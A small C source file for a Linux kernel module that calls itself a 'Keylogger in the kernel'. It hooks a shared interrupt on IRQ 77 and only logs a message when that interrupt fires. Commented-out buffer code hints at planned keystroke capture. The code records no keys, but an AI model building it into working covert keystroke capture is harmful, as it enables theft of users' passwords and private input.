#include <linux/init.h>
#include <linux/module.h>
#include <linux/interrupt.h>
//#include <linux/kfifo.h>
//#include <linux/mutex.h>

//#define FIFO_SIZE 32
//static DECLARE_FIFO(fifo, unsigned char, FIFO_SIZE);

//#define VENDOR_ID 0x258a
//#define DEVICE_ID 0x001e

#define KEYBOARD_IRQ 77

static irqreturn_t handler(int irq, void *dev_id)
{
	printk(KERN_INFO "keyboard irq intercepted: %d\n", irq);

	return IRQ_HANDLED;
}

static int __init keylogger_init(void)
{
	int ret = request_irq(KEYBOARD_IRQ, handler, IRQF_SHARED, "keylogger", (void *)(handler));
	if (ret) {
		printk(KERN_ERR "Failed to request IRQ %d\n", KEYBOARD_IRQ);
		return ret;
	}

	printk(KERN_INFO "Registered keylogger\n");

	return 0;
}

static void __exit keylogger_exit(void)
{
	free_irq(KEYBOARD_IRQ, (void *)(handler));
	printk(KERN_INFO "Keylogger removed\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Niko");
MODULE_DESCRIPTION("Keylogger in the kernel");

